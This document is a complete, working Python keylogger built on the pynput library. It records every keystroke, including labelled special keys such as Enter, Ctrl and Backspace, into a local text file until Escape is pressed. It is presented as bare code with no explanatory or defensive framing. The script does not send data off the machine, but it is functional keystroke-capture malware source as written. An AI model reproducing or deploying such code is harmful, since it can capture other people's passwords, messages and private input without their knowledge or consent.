from pynput import keyboard

log_file = "keylogs.txt"

def write_to_file(text):
    try:
        with open(log_file, "a", encoding="utf-8") as f:
            f.write(text)
    except Exception as e:
        print(f"Error writing to file: {e}")

def on_press(key):
    try:
        if hasattr(key, "char") and key.char is not None:
            write_to_file(key.char)
        else:
            if key == keyboard.Key.space:
                write_to_file(" ")             
            elif key == keyboard.Key.enter:
                write_to_file("\n[ENTER]\n")   
            elif key == keyboard.Key.tab:
                write_to_file("\t[TAB]")    
            elif key == keyboard.Key.backspace:
                write_to_file("[BACKSPACE]")
            elif key == keyboard.Key.shift:
                write_to_file("[SHIFT]")
            elif key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
                write_to_file("[CTRL]")
            elif key == keyboard.Key.alt_l or key == keyboard.Key.alt_r:
                write_to_file("[ALT]")
            else:
                write_to_file(f"[{key.name.upper()}]")
    except Exception as e:
        print(f"Error handling key: {e}")
        
def on_release(key):
    if key == keyboard.Key.esc:
        return False

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
